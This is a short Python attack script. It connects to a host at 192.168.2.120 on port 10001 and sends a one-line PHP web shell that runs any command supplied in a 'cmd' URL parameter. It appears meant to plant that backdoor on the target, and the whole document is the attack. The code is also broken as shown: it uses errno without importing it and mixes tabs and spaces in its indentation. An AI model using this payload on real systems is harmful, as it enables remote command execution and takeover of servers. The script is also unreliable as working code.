import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target = ('192.168.2.120',10001)

while True:
    try:
        s.connect(target)
        s.sendall(b"<?php echo passthru($_GET['cmd']); ?>")
        break
    except socket.error as e:
	if e.errno != errno.ECONNRESET:
		raise
	pass
